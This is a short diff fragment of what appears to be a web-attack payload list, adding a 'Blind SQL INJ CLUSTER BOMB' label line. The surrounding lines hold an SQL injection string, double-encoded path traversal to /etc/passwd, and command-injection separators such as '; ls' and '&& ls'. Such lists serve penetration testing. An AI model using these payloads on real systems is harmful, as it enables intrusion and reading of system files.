@@ -15,7 +15,7 @@ SELECT name, type FROM USERS WHERE name LIKE "%1"; SELECT * FROM USERS WHERE "%"
 ..%252F..%252F..%252Fetc/passwd
 
 /etc/passwd
-
+Blind SQL INJ CLUSTER BOMB (4an16ce04gvvb5d7dsbw)
 ; ls  //Break's  prior command
 & ls
 && ls
